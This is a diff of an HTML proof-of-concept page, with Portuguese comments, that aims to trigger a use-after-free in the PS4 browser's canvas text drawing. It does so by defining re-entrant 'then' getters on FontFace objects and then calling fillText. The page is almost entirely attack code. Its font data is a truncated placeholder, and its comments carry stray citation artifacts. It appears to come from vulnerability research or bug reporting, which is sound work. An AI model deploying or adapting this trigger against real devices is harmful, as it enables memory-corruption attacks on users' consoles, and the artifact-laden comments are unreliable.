@@ -1,54 +1,52 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <title>PoC - PS4 fillText FontMetrics UAF (drawTextInternal)</title>
+    <title>PoC - PS4 drawTextInternal FontMetrics UAF</title>
 </head>
 <body>
-<canvas id="c" width="200" height="200" style="display:none;"></canvas>
 <script>
-  let face = new FontFace('TestFont', 'url("data:font/woff;base64,d09GRgABAAAA...")'); // ou fonte local se preferir
-  document.fonts.add(face);
-  face.loaded;
+async function runPoC() {
+    // 1. Configuração do ambiente de fontes para o gatilho de reentrância
+    const fontDataURL = 'data:font/woff;base64,d09GRgABAAAA...'; // Insira os bytes válidos da fonte ou use o seu setup existente
 
-  let canvas = document.getElementById('c');
-  let ctx = canvas.getContext('2d');
-  ctx.font = '10px TestFont';
+    const face1 = new FontFace('testFace', 'url("' + fontDataURL + '")');
+    const face2 = new FontFace('testFace', 'url("' + fontDataURL + '")');
+    
+    document.fonts.add(face1);
+    document.fonts.add(face2);
 
-  // Cria 500 elementos dummy para registrar FontSelectorClients e forçar o cascade
-  let dummies = [];
-  for (let i = 0; i < 3500; i++) {
-      let d = document.createElement('div');
-      d.style.font = '10px TestFont';
-      document.body.appendChild(d);
-      dummies.push(d);
-  }
+    void face1.loaded;
+    void face2.loaded;
 
-  let reentered = false;
-  Object.defineProperty(FontFace.prototype, 'then', {
-      configurable: true,
-      get() {
-          if (reentered) return undefined;
-          reentered = true;
+    // 2. O gancho reentrante idêntico ao que você já validou no seu report
+    const reenterFontFaceSet = function() {
+        document.fonts.add(new FontFace('unrelated', 'local("Arial")'));
+    };
+    
+    Object.defineProperty(face1, 'then', { get: reenterFontFaceSet, configurable: true });
+    Object.defineProperty(face2, 'then', { get: reenterFontFaceSet, configurable: true });
 
-          // Modifica o estado do documento / limpa o cache de fontes de forma reentrante
-          document.fonts.add(new FontFace('Trigger', 'local(Arial)'));
-          ctx.save();
-          ctx.lineWidth = 5;
-          ctx.restore();
+    const canvas = document.createElement('canvas');
+    canvas.width = 200;
+    canvas.height = 200;
+    canvas.style.position = 'absolute';
+    canvas.style.left = '-9999px';
+    document.body.appendChild(canvas);
+    
+    const context = canvas.getContext('2d');
+    context.font = '10px Times, testFace';
 
-          reentered = false;
-          return undefined;
-      }
-  });
+    // 3. O alvo real: fillText() -> invoca drawTextInternal() no C++ do PS4[span_2](start_span)[span_2](end_span),
+    // onde o fontMetrics é capturado antes de font.width() e consumido depois[span_3](start_span)[span_3](end_span).
+    try {
+        context.fillText(String.fromCharCode(0x13A0), 10, 50);
+    } catch (e) {
+        console.error(e);
+    }
+}
 
-  // Dispara fillText que invoca drawTextInternal() no código nativo do PS4[span_2](start_span)[span_2](end_span)
-  try {
-      ctx.fillText("CrashTest", 10, 10);
-  } catch (e) {
-      console.error(e);
-  }
+runPoC();
 </script>
 </body>
 </html>
